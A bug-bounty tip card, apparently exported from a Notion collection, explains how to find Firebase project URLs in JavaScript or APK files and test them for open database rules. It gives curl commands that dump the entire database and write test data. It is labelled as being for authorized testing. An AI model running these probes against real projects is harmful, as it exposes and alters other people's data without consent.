# Firebase Realtime DB / Firestore open rules → full read/write (classic high impact)

**Rating:** 🔥 قوية  
**Category:** API Hacking, Recon  
**Status:** Not started  

## How It Works

من الـ JS أو APK (apktool + grep firebaseio) خد الـ project URL. جرب /.json. لو data رجعت = public read. جرب POST/PUT عشان write. حتى لو Permission denied، جرب self-register + auth != null rules.

## Payload / Code

```
curl https://PROJECT.firebaseio.com/.json
curl -X PUT -d '{"test":"bounty"}' https://PROJECT.firebaseio.com/test.json
```

## Source

Multiple writeups + Intigriti Firebase guide + mobile APK decompile tips

---

_Synced from Notion: Bug Bounty Tips and Tricks. Authorized testing only._
